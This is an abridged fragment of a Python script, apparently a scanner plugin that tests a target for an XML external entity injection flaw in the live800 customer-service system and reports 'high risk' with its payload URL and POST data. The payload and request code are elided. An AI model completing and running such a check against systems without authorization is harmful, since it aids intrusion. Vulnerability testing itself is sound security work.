        ...
        try:
            ...
            for vulnurl in vulnurls:
                ...
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    printGreen("[+]Success:存在live800在线客服系统XML实体注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4))
                    noexist = False
            if noexist:
                printBlue("[-]Info:不存在live800_services_xxe漏洞")
        except:
...
if __name__ == "__main__":
    ...
    testVuln = live800_services_xxe(sys.argv[1])
    testVuln.run()
